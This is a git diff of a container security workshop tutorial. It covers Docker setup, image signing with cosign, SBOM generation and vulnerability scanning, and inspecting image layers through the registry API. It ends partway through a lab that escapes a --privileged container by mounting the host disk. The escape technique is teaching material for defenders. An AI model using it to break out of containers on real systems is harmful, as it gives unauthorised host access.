@@ -5,21 +5,23 @@ Welcome to my Container Security 101 workshop! If you'd like to sign up, you can
 
 ## Agenda
 
-1. Create secure and insecure container images.
-1. Perform container image signing.
-1. Create SBOMs.
-1. Vulnerability scan the images.
-1. Dig into the container image manifests, indexes, and layers.
-1. Break out of a misconfigured container.
+1. [Create secure and insecure container images](creating-images)
+1. [Perform container image signing](image-signing)
+1. [Create SBOMs](making-a-software-bill-of-materials)
+1. [Vulnerability scan the images](vulnerability-scanning-images)
+1. [Dig into the container image manifests, layers, and configurations](container-image-components)
+1. [Break out of a misconfigured container](ready-set-break)
 
 ## Getting started
 
 ```{important}
-This lab expects that you are running on Ubuntu 20.04 x86; see [this guide](../ref/aws_ubuntu20.04.md) if you need help
-setting that up.
+This lab expects that you are running on a fresh Ubuntu 20.04 x86 system.
 
-I highly recommend using a fresh, ephemeral system, as there is no deterministic way to "undo" all of the steps below
-after the workshop.
+To provision a fresh environment, you can use our [CloudFormation
+Template](https://console.aws.amazon.com/cloudformation/home#/stacks/create/review?templateURL=https://excited-flunk-music.s3.us-east-2.amazonaws.com/launch/workshop_vm.yml&stackName=Container-Security-101-Workshop),
+which will create an EC2 instance and some minimal accompanying resources.
+
+After provisioning is complete, see the "Outputs" to get the information needed to connect into your system.
 ```
 
 This lab is meant to be run in order from top to bottom. If you skip around, it is possible some prerequisites may not
@@ -30,44 +32,44 @@ widely adopted and simplest place to start.
 
 Run the following to setup the prerequisite tools:
 
-```{code-block} console
-$ sudo apt-get update
-$ sudo apt-get -y remove docker.io containerd runc
-$ sudo apt-get -y install --no-install-recommends ca-certificates curl gnupg
-$ sudo install -m 0755 -d /etc/apt/keyrings
-$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
-$ sudo chmod a+r /etc/apt/keyrings/docker.gpg
-$ echo \
-  "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
-  "$(. /etc/os-release && echo "$VERSION_CODENAME")" stable" | \
-  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-$ sudo apt-get update
-$ sudo apt-get -y install --no-install-recommends docker-ce docker-ce-cli containerd.io docker-buildx-plugin jq
+```{code-block} bash
+if [[ -x "$(which sudo)" ]]; then sudo apt-get update; else su -c 'apt-get update'; fi
+if [[ -x "$(which sudo)" ]]; then sudo apt-get -y install ca-certificates curl sudo jq; else su -c 'apt-get -y install ca-certificates curl sudo jq'; fi
 ```
 
-```{note}
-When you encounter code blocks, like above, it will show a copy button when you mouse over it if it is meant to be
-copied/pasted directly.
+Now we can download and run the setup script from docker. Note that this script is meant purely for development
+environments, such as our lab environment, and is not meant for production use.
 
-After copy/pasting into your system, you will need to hit enter for all of the lines to be run.
+```{code-block} bash
+curl -fsSL https://get.docker.com -o get-docker.sh
+sudo sh get-docker.sh
 ```
 
-Now, if you attempt to run `docker` commands, you will find that they fail:
+Now, if you attempt to run `docker` commands as any user other than `root`, you will find that they fail:
 
 ```{code-block} console
+---
+class: no-copybutton
+---
 $ docker ps
 Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.24/containers/json": dial unix /var/run/docker.sock: connect: permission denied
 ```
 
-In order to fix that, add your user to the `docker` group (in this example, we're updating the default `ubuntu` user).
-
-```{code-block} console
-$ sudo usermod -aG docker ubuntu
+```{note}
+When you encounter code blocks that don't show a copy button, like the one above, it means it is only meant as an
+example and is **not meant to be run**
 ```
 
-And then you **must log out** and re-authenticate to your Ubuntu system.
+In order to fix that, add your user to the `docker` group.
 
-After doing that, your `docker` commands should now succeed:
+```{code-block} console
+if [[ "$(whoami)" != "root" ]]; then sudo usermod -aG docker "$(whoami)"; fi
+```
+
+Now, if you know your password you can run `exec su -l "$(whoami)"`, otherwise you will need to **exit your SSH
+session** and re-connect.
+
+Now your `docker` commands should now succeed:
 
 ```{code-block} console
 $ docker ps
@@ -166,32 +168,24 @@ Running as `root` is not preferred, and although there are [ways to
 secure](https://docs.docker.com/engine/security/userns-remap/) a process that must run as `root`, it should not be the
 default. So, let's fix that.
 
-We'll start by making a temporary working area:
-
-```{code-block} console
-$ newdir=$(mktemp -d)
-$ pushd "${newdir}"
-```
-
-And then we create a `Dockerfile` that defines a more secure image. It starts with `FROM nginx`, meaning that we are
-building on top of the upstream `nginx` image, inheriting all of its secure (or insecure) properties, and then adding
-our changes on top.
+We'll start by creating a `Dockerfile` that defines a more secure image. It starts with `FROM nginx`, meaning that we
+are building on top of the upstream `nginx` image, inheriting all of its secure (or insecure) properties, and then
+adding our changes on top.
 
 ```{code-block} bash
 cat << EOF > Dockerfile
 FROM nginx
-RUN groupadd --gid 53150 -r notroot \
- && useradd -r -g notroot -s "\$(which bash)" --create-home --uid 53150 notroot
+RUN groupadd --gid 53150 -r notroot && useradd -r -g notroot -s "/bin/bash" --create-home --uid 53150 notroot
 USER notroot
 EOF
 ```
 
-Now we can build the more secure image and examine it to see what the configured `User` is. Note the user on the last
+Then we can build the more secure image and examine it to see what the configured `User` is. Note the user on the last
 line is _not_ the root user.
 
 ```{code-block} console
 ---
-emphasize-lines: 17
+emphasize-lines: 15
 ---
 $ docker buildx build -t example-secure .
 [+] Building 1.0s (6/6) FINISHED
@@ -201,13 +195,11 @@ $ docker buildx build -t example-secure .
  => => transferring context: 2B                                                                                                  0.0s
  => [internal] load metadata for docker.io/library/nginx:latest                                                                  0.0s
  => [1/2] FROM docker.io/library/nginx                                                                                           0.1s
- => [2/2] RUN groupadd --gid 53150 -r notroot  && useradd -r -g notroot -s "$(which bash)" --create-home --uid 53150 notroot     0.5s
+ => [2/2] RUN groupadd --gid 53150 -r notroot  && useradd -r -g notroot -s "/bin/bash" --create-home --uid 53150 notroot         0.5s
  => exporting to image                                                                                                           0.2s
  => => exporting layers                                                                                                          0.2s
  => => writing image sha256:4d20cb10ba62fdea186dae157c2f08980efba65de1e2b86f708da46847c62570                                     0.0s
  => => naming to docker.io/library/example-secure                                                                                0.0s
-$ popd
-~
 $ docker inspect example-secure | jq -r '.[].Config.User'
 notroot
 ```
@@ -277,7 +269,7 @@ The most precise way to sign an image is to sign the digest, as opposed to a tag
 of an image over time. Let's retrieve the digest for our `example-secure` image:
 
 ```{code-block} console
-$ docker inspect --format='{{index .RepoDigests 0}}' example-secure
+$ docker inspect --format='{{index .RepoDigests 0}}' example-secure || true
 
 template parsing error: template: :1:2: executing "" at <index .RepoDigests 0>: error calling index: reflect: slice
 index out of range
@@ -317,20 +309,19 @@ that more later.
 However, we want our `example-secure` image to have a digest. We can fix this by running a v2 registry locally and then
 pushing the image to it!
 
-We'll start by setting up HTTPS, and then pulling down a registry image and running the container:
+We'll start by setting up HTTPS, and then pulling down a registry image and running the container. If you look closely,
+you'll notice the use of a "dummy" container below; this is being used to load files into a volume and is a well known
+[work-around](https://github.com/moby/moby/issues/25245#issuecomment-365980572) for a feature that can be voted for
+[here](https://github.com/docker/cli/issues/1436).
 
 ```{code-block} console
 $ newdir=$(mktemp -d)
 $ mkdir -p "${newdir}/certs"
 $ pushd "${newdir}/certs"
 /tmp/tmp.hzH6IxKkz2/certs ~
-$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 60 -nodes -subj "/CN=registry"
-Generating a RSA private key
-....................................++++
-..................................................................................................................................................................................................................++++
-writing new private key to 'key.pem'
------
-$ docker run -d -p 443:443 --name registry -v "$(pwd)":/certs -e REGISTRY_HTTP_ADDR=0.0.0.0:443 -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/cert.pem -e REGISTRY_HTTP_TLS_KEY=/certs/key.pem registry:2
+$ docker volume create workshop-certs
+workshop-certs
+$ docker container create --name dummy -v workshop-certs:/certs registry:2
 
 Unable to find image 'registry:2' locally
 2: Pulling from library/registry
@@ -341,6 +332,18 @@ ca8951d7f653: Pull complete
 5ee46e9ce9b6: Pull complete
 Digest: sha256:8c51be2f669c82da8015017ff1eae5e5155fcf707ba914c5c7b798fbeb03b50c
 Status: Downloaded newer image for registry:2
+26d8c595ffd35fe4b8a0797533cf7c9749f93bbd0d66baa960f86ea75618661b
+$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 60 -nodes -subj "/CN=registry"
+Generating a RSA private key
+....................................++++
+..................................................................................................................................................................................................................++++
+writing new private key to 'key.pem'
+-----
+$ docker cp cert.pem dummy:/certs/cert.pem
+Successfully copied 3.58kB to dummy:/certs/cert.pem
+$ docker cp key.pem dummy:/certs/key.pem
+Successfully copied 5.12kB to dummy:/certs/key.pem
+$ docker run -d -p 443:443 --name registry -v workshop-certs:/certs -e REGISTRY_HTTP_ADDR=0.0.0.0:443 -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/cert.pem -e REGISTRY_HTTP_TLS_KEY=/certs/key.pem registry:2
 fa830229c72a484fa1b1c18ffc9039712b2561d4aa5c8f7856ed00b3e275ed65
 $ popd
 ~
@@ -385,13 +388,21 @@ fa830229c72a484fa1b1c18ffc9039712b2561d4aa5c8f7856ed00b3e275ed65   registry:2   
 You'll noticed that the output is significantly longer and harder to read now, but it avoids any truncation.
 
 If you'd like to interact with a running container, you can use this container ID, or the associated name (in my
-example, `registry`). For instance:
+example, `registry`). For instance, here we use the container ID (which will be different in your case):
 
 ```{code-block} console
+---
+class: no-copybutton
+---
 $ docker exec fa8302 ps
 PID   USER     TIME  COMMAND
     1 root      0:01 registry serve /etc/docker/registry/config.yml
    16 root      0:00 ps
+```
+
+And here we use the name to accomplish the same thing:
+
+```{code-block} console
 $ docker exec registry ps
 PID   USER     TIME  COMMAND
     1 root      0:01 registry serve /etc/docker/registry/config.yml
@@ -451,7 +462,7 @@ In order to sign the image, we will:
 1. Verify the `example-secure` signature using the public key
 
 We're also going to be using a number of new `docker` arguments below; if you'd
-like to look into those futher, see the `docker run` documentation
+like to look into those further, see the `docker run` documentation
 [here](https://docs.docker.com/engine/reference/commandline/run/).
 
 ```{code-block} console
@@ -466,8 +477,8 @@ $ docker network create workshop
 316fa415e729ff7f48319daf815e7e2842da09d76e948eb51b7d5823dec082ee
 $ docker network connect workshop registry
 $  export COSIGN_PASSWORD='example'
-$ docker run -e COSIGN_PASSWORD -u 0 -v "$(pwd):/app" -w /app cgr.dev/chainguard/cosign generate-key-pair
-$ image_digest="$(docker inspect --format='{{index .RepoDigests 0}}' localhost:443/example-secure | cut -f2 -d@)"
+$ docker run -e COSIGN_PASSWORD -u 0 --network workshop -v "$(pwd):/app" -w /app cgr.dev/chainguard/cosign generate-key-pair
+$ image_digest="$(docker inspect --format='{{index .RepoDigests 0}}' localhost:443/example-secure | cut -f2 -d@ )"
 $ docker run -e COSIGN_PASSWORD -u 0 --network workshop -v "$(pwd):/app" -w /app cgr.dev/chainguard/cosign sign --yes --key cosign.key -a tag=latest registry:443/example-secure@"${image_digest}" --allow-insecure-registry
 
         The sigstore service, hosted by sigstore a Series of LF Projects, LLC, is provided pursuant to the Hosted Project Tools Terms of Use, available at https://lfprojects.org/policies/hosted-project-tools-terms-of-use/.
@@ -521,7 +532,7 @@ exclude the specific `.key` file entirely.
 class: dropdown
 ---
 Technically, the above approach is not the most secure way to do this because it has a race condition. It requires that
-an image be pushed prior to being signed, and has no way to accomodate signing failures.
+an image be pushed prior to being signed, and has no way to accommodate signing failures.
 
 However, there is not a great alternative right now. `docker` doesn't populate the repo digest until it's `docker
 push`ed, and `cosign` also doesn't support a sign-then-push workflow.
@@ -568,13 +579,13 @@ $ curl https://rekor.sigstore.dev/api/v1/log/entries/24296fb24b8ad77ad9ca41820f9
 Well, that was a lot. If you'd like, you can also view the details in a web browser
 [here](https://search.sigstore.dev/?logIndex=18624203).
 
-```{admonition} Section wrap-up
+```{admonition} Storing Image Signatures
 ---
-class: hint
+class: seealso
 ---
 Today, the way that these signatures are hosted is that they are `in-toto`
 [attestations](https://github.com/in-toto/attestation) bundled into OCI artifacts, and uploaded to a registry with a
-specifically formatted name of `sha256:<DIGEST>.sig` where <DIGEST> is the image digest.
+specifically formatted name of `sha256-<DIGEST>.sig` where <DIGEST> is the image digest.
 
 This works great because the registry only needs to support OCI artifacts, which most (effectively all) of them do, and
 if you are running a container, you are always able to look up the digest of the related image.
@@ -593,58 +604,158 @@ If you'd like more of an introduction to Reference Types, I recommend the chaing
 [here](https://www.chainguard.dev/unchained/intro-to-oci-reference-types).
 ```
 
-## Vulnerability scanning images
+## Making a Software Bill of Materials
 
-### Approaches
+Now that we have a docker image, we want to have a structured way to know what's in it, and if there are any
+vulnerabilities that may need tending to. There are a few different approaches we can take here, but the most modern
+(and increasingly popular) is to generate a Software Bill of Materials (SBOM), and then assess that SBOM artifact for
+issues.
 
-SBOM generate-then-scan
+This is effectively how Software Composition Analysis (SCA) tools have worked for years, except that we're now uniformly
+using standard formats for determining software composition, such as [SPDX](https://spdx.dev/) and
+[CycloneDX](https://cyclonedx.org/), which are meant for information exchange (such as between vendors and software
+consumers). SBOMs can also support enrichment through specifications like
+[VEX](https://www.ntia.gov/files/ntia/publications/vex_one-page_summary.pdf) (see the nitty gritty on VEX
+[here](https://docs.oasis-open.org/csaf/csaf/v2.0/csd01/csaf-v2.0-csd01.html#45-profile-5-vex) and a recent more
+opinionated specification called OpenVEX [here](https://github.com/openvex/spec/blob/main/OPENVEX-SPEC.md)).
 
-Scan the image
+Let's get started by creating an SBOM with a popular generation tool, [`syft`](https://github.com/anchore/syft):
 
-Scan the repository
-
-Why is scan the image better than repository?
-
-TODO: Generate an SBOM with syft. Briefly cover CycloneDX and SPDX, as well as syft's proprietary format.
+```{code-block} console
+$ docker run -v "$(pwd):/tmp" -v /var/run/docker.sock:/var/run/docker.sock anchore/syft:latest docker:example-secure -o json --file example-secure.sbom.json
+Unable to find image 'anchore/syft:latest' locally
+latest: Pulling from anchore/syft
+b5dc3672f171: Pull complete
+46399d889351: Pull complete
+05b8cdb378a3: Pull complete
+Digest: sha256:ffde5d9aa0468a9bd7761330e585a8a9050fda7ae6a5fa070a29f4a6f922088a
+Status: Downloaded newer image for anchore/syft:latest
+$ ls -sh example-secure.sbom.json
+2.5M example-secure.sbom.json
+$ jq '.artifacts | length' < example-secure.sbom.json
+143
+```
 
 ```{note}
 ---
 class: dropdown
 ---
-Changes to the code can happen during build, including bringing in new dependences, or different versions of known
-dependencies.
+This SBOM may not show _exactly_ what ends up running in production.
 
-While containers could technically also make those changes at runtime, it is significantly less popular and easier to
-monitor for/prevent.
+While dependencies are typically downloaded at build time, processes in containers could technically also download
+additional dependencies or make other changes at runtime. In practice, it is significantly less popular and easier to
+monitor for/prevent, but something to be aware of.
 ```
 
-TODO: Examine the SBOM for `nginx`.
+This will create a new file, `example-secure.sbom.json` containing an SBOM of what it was able to find in our
+`example-secure` image, identifying 143 (!?!) different artifacts. Think that our 160MB container only had `nginx` in
+it? Think again!
 
-TODO: run grype on the `nginx` sbom.
+You also may be asking, which of the above standard SBOM formats did this output in? Great question; and the answer is
+none of the above. When you run with the `json` output format (like we did above) `syft` uses a proprietary SBOM format
+to "get as much information out of Syft as possible!"
 
-Move to `cgr.dev/chainguard/nginx`, re-run the SBOM and grype, compare the results. Refer back to the implicit nginx
-registry/tag from above.
+## Vulnerability scanning images
 
-Check for the chainguard signature. Nice! They have it. Consider cgr alternatives, supply chain, etc.
-
-Now, what if you don't know what supply chain security information exists for a given image? There's a helper for that!
-
-We can use the `cosign tree` command to "Display supply chain security related artifacts for an image such as
-signatures, SBOMs and attestations". Let's take a look at what the `cgr.dev/chainguard/cosign` image that we've been
-using to run `cosign` commands has available:
+Now, why did we use the `json` output format for our SBOM? Well, in this case we would like to pass this SBOM file into
+another tool called [`grype`](https://github.com/anchore/grype) to do some vulnerability scanning. Since both tools are
+developed and maintained by Anchore, you can see why this format is the _only_ SBOM format which is supported to do a
+`grype` scan.
 
 ```{code-block} console
-$ docker run cgr.dev/chainguard/cosign tree cgr.dev/chainguard/cosign
-📦 Supply Chain Security Related artifacts for an image: cgr.dev/chainguard/cosign
-└── 💾 Attestations for an image tag: cgr.dev/chainguard/cosign:sha256-d15e181a549c2086aebaeafcd731bf7daaae8f07f4bd45ec22520d75fb849085.att
-   ├── 🍒 sha256:db7407d7255baa87a62874e548ad9c45dd71fd388b1cec2752e3c326ce122bd1
-   ├── 🍒 sha256:56d78c3c69009365e9431221272f4a9ecc2f7e0cf510b82bd7e88b3bf265ebf0
-   ├── 🍒 sha256:644c4d060943cab88b0b128188bbda049598dda413a5bdb610a3f2c3a959847a
-   └── 🍒 sha256:30845e6bee8de3885d82fecdfdaa3755c1f30b07e2902a34c07651cb14594a7f
-└── 🔐 Signatures for an image tag: cgr.dev/chainguard/cosign:sha256-d15e181a549c2086aebaeafcd731bf7daaae8f07f4bd45ec22520d75fb849085.sig
-   └── 🍒 sha256:e5d73bd8602c35b5d0a33a095329ac63e4bc6dc3f03d83c7594cc9e317d5d4f0
-└── 📦 SBOMs for an image tag: cgr.dev/chainguard/cosign:sha256-d15e181a549c2086aebaeafcd731bf7daaae8f07f4bd45ec22520d75fb849085.sbom
-   └── 🍒 sha256:e5f7592e081e7e7ba55e2941e2ed1d324b0e62e7ce02e1052fcf7ebdee2d6445
+$ docker run -v "$(pwd):/tmp" anchore/grype sbom:example-secure.sbom.json --output json --file example-secure.vulns.json
+Unable to find image 'anchore/grype:latest' locally
+latest: Pulling from anchore/grype
+3d4811e75147: Pull complete
+657b6e8ab91d: Pull complete
+e58480bec473: Pull complete
+Digest: sha256:9d326e7fc0e4914481a2b0c458a0eb0891b04d00569a6f92bdc549507f2089a0
+Status: Downloaded newer image for anchore/grype:latest
+Report written to "example-secure.vulns.json"
+$ ls -sh example-secure.vulns.json
+528K example-secure.vulns.json
+$ jq '.matches | length' < example-secure.vulns.json
+144
+```
+
+In this example we can see that this container has 144 vulnerabilities of various severities.
+
+Now that we know what we know about `nginx`, let's take a look at an alternative container which also contains a
+functional `nginx` binary, but brings along with it fewer accessories (i.e. attack surface).
+
+One newer alternative are the chainguard images, built on
+[wolfi](https://www.chainguard.dev/unchained/introducing-wolfi-the-first-linux-un-distro), which are meant to be
+minimal, secure-by-default, and heavily maintained images that provide a secure foundation for others to build on top
+of.
+
+Let's re-run our SBOM generation and vulnerability scan steps from before, but this time against the
+`cgr.dev/chainguard/nginx` version of `nginx`:
+
+```{code-block} console
+$ docker run -v "$(pwd):/tmp" -v /var/run/docker.sock:/var/run/docker.sock anchore/syft:latest docker:cgr.dev/chainguard/nginx -o json --file chainguard-nginx.sbom.json
+$ ls -sh chainguard-nginx.sbom.json
+140K chainguard-nginx.sbom.json
+$ jq '.artifacts | length' < chainguard-nginx.sbom.json
+26
+$ docker run -v "$(pwd):/tmp" anchore/grype sbom:chainguard-nginx.sbom.json --output json --file chainguard-nginx.vulns.json
+[0000]  WARN unknown relationship type: described-by form-lib=syft
+<repeated warnings removed for brevity>
+[0000]  WARN unknown relationship type: described-by form-lib=syft
+Report written to "chainguard-nginx.vulns.json"
+$ ls -sh chainguard-nginx.vulns.json
+8.0K chainguard-nginx.vulns.json
+$ jq '.matches | length' < chainguard-nginx.vulns.json
+0
+```
+
+Huh, 0 vulnerabilities; did it even work?
+
+Or at least, that's where my mind goes when I see something _so_ extreme.
+
+But, that's actually by design. Chainguard is so proud of their consistently low vulnerabilities that they provide an
+[interactive
+graph](https://visualization-ui.chainguard.app/bar?left=nginx%3alatest&right=cgr.dev%2fchainguard%2fnginx%3alatest) that
+you can use to compare the `nginx:latest` findings to the `cgr.dev/chainguard/nginx:latest` findings (at least according
+to [Trivy](https://github.com/aquasecurity/trivy), another popular docker image vulnerability scanning tool).
+
+```{note}
+Worried about those "unknown relationship type" errors? I was too, until I found [this
+issue](https://github.com/anchore/grype/issues/1244) describing that this is due to new information coming from `syft`
+that `grype` hasn't been updated to be able to make use of yet. If you're running this lab and not seeing those issues,
+it means that `grype` has had a release and is now in sync with the `syft` outputs.
+```
+
+I wonder, do we even need our `example-secure` image from before? Let's quickly check the user of this new `nginx`
+image:
+
+```{code-block} console
+$ docker inspect cgr.dev/chainguard/nginx:latest | jq -r '.[].Config.User'
+65532
+```
+
+Well, that's definitely not the `root` user (UID 0)! 🎉
+
+It seems like this may be one good option (of numerous) that we could build on top of.
+
+All of this analysis is really just a start, and if you are looking for a new image to build on top of, you likely would
+have more questions to ask before you have enough information to make a decision.
+
+To get you pointed in the right direction for some initial investigation, you can use the `cosign tree` command to
+"Display supply chain security related artifacts for an image such as signatures, SBOMs and attestations". Let's take a
+look at what else the `cgr.dev/chainguard/nginx` image has available:
+
+```{code-block} console
+$ docker run cgr.dev/chainguard/cosign tree cgr.dev/chainguard/nginx
+📦 Supply Chain Security Related artifacts for an image: cgr.dev/chainguard/nginx
+└── 💾 Attestations for an image tag: cgr.dev/chainguard/nginx:sha256-475b56541eec5bf8ef725c8e8912dc1451e01d6065f0ceac7f6a39cb229fcfe2.att
+   ├── 🍒 sha256:428c41b65c98785fdaa1ebcd2169851c9717ead2092cfe95169e8c992ec40295
+   ├── 🍒 sha256:cbeec866936c4177184d1a17af697440ce3b67acb176d314876a3c8f0ca56f53
+   ├── 🍒 sha256:575d374e029b5a8078878683894fa8bc32a88bb666c656d0bb9c30afccd2668c
+   └── 🍒 sha256:c61a3bc4599bdb41b9734b039b68156a7304bd5de7b8df08679a203171b5d784
+└── 🔐 Signatures for an image tag: cgr.dev/chainguard/nginx:sha256-475b56541eec5bf8ef725c8e8912dc1451e01d6065f0ceac7f6a39cb229fcfe2.sig
+   └── 🍒 sha256:a921b47f93ddc97afd697d37b1f63527a32e1aa1a93e1a3068b6984e637adce9
+└── 📦 SBOMs for an image tag: cgr.dev/chainguard/nginx:sha256-475b56541eec5bf8ef725c8e8912dc1451e01d6065f0ceac7f6a39cb229fcfe2.sbom
+   └── 🍒 sha256:c67b16667b9e1e9dd520b654d93ace750a05169494636b2581079f827e4259c6
 ```
 
 Not bad! In addition to a signature and SBOM, there are 4 additional attestations available for this image that we could
@@ -652,63 +763,268 @@ use to evaluate and make policy decisions about whether or not we're comfortable
 
 ## Container image components
 
-High level explanation. manifests, indexes, and layers. Call back to signature process; what is actually being signed?
-How does that work for multi-platform images?
+Alright, now it's time to get a little bit ... deeper.
 
-Remember how we mentioned earlier that image signatures, vulnerability scan attestations, and other artifacts are
-currently uploaded to a registry as separate OCI artifacts? Well, `crane` gives you a way to take a peek under the
-covers and see those separate artifacts directly.
+So far we've covered a little bit about docker images and OCI artifacts, but what exactly _is_ an image?
 
-TODO: 1 paragraph background on crane. Example of where it's used?
+You may remember from our [terminology](terminology) section that an image is a bundle of configuration, metadata, and
+files in a structured format.
 
-### Manifests
+That bundle can be uniquely identified using an image manifest digest, which is just another name for the digest we've
+been using all along. Here you can us retrieve the manifest digest and use it to make API calls to the registry:
 
 ```{code-block} console
-$ docker run cgr.dev/chainguard/crane
-output example here
+---
+emphasize-lines: 3,5,7
+---
+$ mdigest=$(docker inspect --format='{{index .RepoDigests 0}}' example-secure | cut -f2 -d@)
+$ echo $mdigest
+sha256:63e226a559065a971cfd911a91fefe7f1c96693186467ad182ca9dd9b64d078c
+$ curl -k https://localhost:443/v2/example-secure/tags/list
+{"name":"example-secure","tags":["sha256-63e226a559065a971cfd911a91fefe7f1c96693186467ad182ca9dd9b64d078c.sig","latest"]}
+$ curl -s -k https://localhost:443/v2/example-secure/manifests/$digest | sha256sum
+63e226a559065a971cfd911a91fefe7f1c96693186467ad182ca9dd9b64d078c  -
+$ curl -s -k https://localhost:443/v2/example-secure/manifests/$mdigest | head -14
+{
+   "schemaVersion": 2,
+   "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+   "config": {
+      "mediaType": "application/vnd.docker.container.image.v1+json",
+      "size": 7705,
+      "digest": "sha256:6b7f86a3d64be8fb0ece35d5b54b15b6bd117c7fdcf2f778350de9012186fd14"
+   },
+   "layers": [
+      {
+         "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+         "size": 31418228,
+         "digest": "sha256:26c5c85e47da3022f1bdb9a112103646c5c29517d757e95426f16e4bd9533405"
+      },
 ```
 
-What part of this output is most interesting?
+Note that the digest is the same on each of the above highlighted lines, even the one that is the result of a
+`sha256sum`, showing that it is a content addressable store. That is, the contents of the data returned by the API are
+the same as its SHA-256 sum.
 
-:::{admonition} Answer
+You can repeat this same sort of approach for the other two key components of an image; let's look at the first file
+system layer first:
+
+```{code-block} console
 ---
-class: dropdown hint
+emphasize-lines: 7-16
 ---
-```{code-block} bash
----
-class: no-copybutton
-emphasize-lines: 2
----
-$ docker run cgr.dev/chainguard/crane
-output example here
+$ ldigest=$(curl -s -k https://localhost:443/v2/example-secure/manifests/$mdigest | jq -r '.layers[0].digest')
+$ echo $ldigest
+sha256:26c5c85e47da3022f1bdb9a112103646c5c29517d757e95426f16e4bd9533405
+$ curl -s -k https://localhost:443/v2/example-secure/blobs/$ldigest | sha256sum
+26c5c85e47da3022f1bdb9a112103646c5c29517d757e95426f16e4bd9533405  -
+$ curl -s -k https://localhost:443/v2/example-secure/blobs/$ldigest | tar -tvzf - | head
+drwxr-xr-x 0/0               0 2023-04-11 00:00 bin/
+-rwxr-xr-x 0/0         1234376 2022-03-27 18:40 bin/bash
+-rwxr-xr-x 0/0           43936 2020-09-24 08:36 bin/cat
+-rwxr-xr-x 0/0           72672 2020-09-24 08:36 bin/chgrp
+-rwxr-xr-x 0/0           64448 2020-09-24 08:36 bin/chmod
+-rwxr-xr-x 0/0           72672 2020-09-24 08:36 bin/chown
+-rwxr-xr-x 0/0          151168 2020-09-24 08:36 bin/cp
+-rwxr-xr-x 0/0          125560 2020-12-10 13:23 bin/dash
+-rwxr-xr-x 0/0          113664 2020-09-24 08:36 bin/date
+-rwxr-xr-x 0/0           80968 2020-09-24 08:36 bin/dd
 ```
-:::
 
-### Index
+What's particularly notable here is that we can actually start to investigate the files that are in this layer!
 
-### Layers
+Now, why is it called a layer? Well, the filesystem for images is built on something called the Union filesystem, or
+Unionfs. It allows us to have multiple different bundles of files (layers) which are then iteratively decompressed on
+top of each other when you run a container to then create the final, merged filesystem that you actually see at runtime.
 
-## Read, Set, Break!
+This also means that, just because a file has a certain set of contents at runtime doesn't mean that's the _only_
+version of that file in the image. You may find a different file in a prior layer that was overwritten by the newer
+layer.
 
-### Successful breakout
+This is where we can encounter security issues. These files become "hidden" at runtime, but they are very much available
+in the image itself, if you know where to look, and sometimes they can contain sensitive information such as passwords
+or keys.
 
-CAP_SYS_ADMIN? Mounted docker sock?
+Okay, let's move onto the third and final component of an image, the configuration!
+
+```{code-block} console
+$ cdigest=$(curl -s -k https://localhost:443/v2/example-secure/manifests/$mdigest | jq -r '.config.digest')
+$ echo $cdigest
+sha256:6b7f86a3d64be8fb0ece35d5b54b15b6bd117c7fdcf2f778350de9012186fd14
+$ curl -s -k https://localhost:443/v2/example-secure/blobs/$cdigest | sha256sum
+6b7f86a3d64be8fb0ece35d5b54b15b6bd117c7fdcf2f778350de9012186fd14  -
+$ curl -s -k https://localhost:443/v2/example-secure/blobs/$cdigest | jq -r '.config.Env[]'
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+NGINX_VERSION=1.23.4
+NJS_VERSION=0.7.11
+PKG_RELEASE=1~bullseye
+$ curl -s -k https://localhost:443/v2/example-secure/blobs/$cdigest | jq -r '.history[15]'
+{
+  "created": "2023-04-26T00:50:44.615696269Z",
+  "created_by": "RUN /bin/sh -c groupadd --gid 53150 -r notroot && useradd -r -g notroot -s \"/bin/bash\" --create-home --uid 53150 notroot # buildkit",
+  "comment": "buildkit.dockerfile.v0"
+}
+```
+
+Just like with the layers, we can see some very interesting information by dissecting an image configuration. In the
+highlighted lines above we see the environment variables that this image has configured, as well as each of the
+historical steps taken at build time. Specifically, I am showing the user creation step from earlier in the lab.
+
+This information is available to anybody who can pull the image, and is another place where you may find sensitive
+information exposed unintentionally. For instance, was a secret passed in at build time and used in a command to pull
+code from your internal repositories? Or perhaps a secret is needed at runtime to decrypt some files and it's stored as
+an environment variable. Both of those are easily exposed to anybody with read access.
+
+The real solution here is to avoid secrets from being stored in your images in the first place. While there are many
+reasonable approaches to prevent this, I highly recommend [multi-stage
+builds](https://docs.docker.com/build/building/multi-stage/) and providing secrets at build time safely using
+[environment variables](https://github.com/moby/buildkit/pull/1534).
+
+```{note}
+As a brief aside, if using `curl` to custom-create API queries isn't your thing, but you still need to take a peek under
+the covers from time to time, I recommend using
+[`crane`](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md).
+```
+
+```{seealso}
+Want more like the above? Well, to start I recommend checking out
+[this](https://raesene.github.io/blog/2023/02/11/Fun-with-Containers-adding-tracking-to-your-images/) incredibly
+interesting blog posts about how OCI images can be modified to track when it's pulled, and anything online from a group
+that calls themselves [SIG-Honk](https://www.youtube.com/results?search_query=sig-honk).
+```
+
+## Ready, Set, Break!
+
+Alright, now it's time for container escape.
+
+First, we'll run by running standard ubuntu container with some additional privileges, sometimes used when trying to
+troubleshoot permissions issues:
+
+```{code-block} console
+$ docker run -it --privileged ubuntu:20.04
+```
+
+Then, by abusing the additional access from the `--privileged` argument, we can mount the host filesystem, which in my
+example is on `/dev/xvda1`:
+
+```{code-block} console
+---
+emphasize-lines: 5-7
+---
+$ mount | grep '/dev/'
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
+mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
+shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
